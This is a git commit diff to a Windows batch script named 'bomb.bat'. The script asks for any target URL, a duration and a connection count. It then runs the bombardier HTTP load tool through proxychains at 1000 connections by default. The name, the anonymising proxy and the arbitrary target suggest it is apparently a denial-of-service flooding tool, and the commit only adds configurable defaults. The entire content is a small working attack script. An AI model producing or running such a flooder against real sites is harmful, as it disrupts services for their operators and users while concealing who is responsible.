bf9d90d95c1a3b208f182d4f34d8d617db1aa8f1
MyNameIsKitsune <i.misterok21@gmail.com>
2022-02-28 16:28:44 +0200

    Update bomb.bat

--- bomb.bat
+++ bomb.bat
@@ -1,5 +1,8 @@
 @echo off
 set /p url="Enter Url: "
-set /p dur="Enter Duration (ex. 10s, 10m, 1h): "
-bash -c "proxychains -q bombardier -c 1000 -d %dur% -l -p i,p,r %url%"
+set /p dur="Enter Duration (ex. 10s, 10m, 1h, default: 30s): "
+set /p con="Enter Connections (default: 1000): "
+IF NOT DEFINED dur SET "dur=30s"
+IF NOT DEFINED con SET "con=1000"
+bash -c "proxychains -q bombardier -c %con% -d %dur% -l -p i,p,r %url%"
 pause
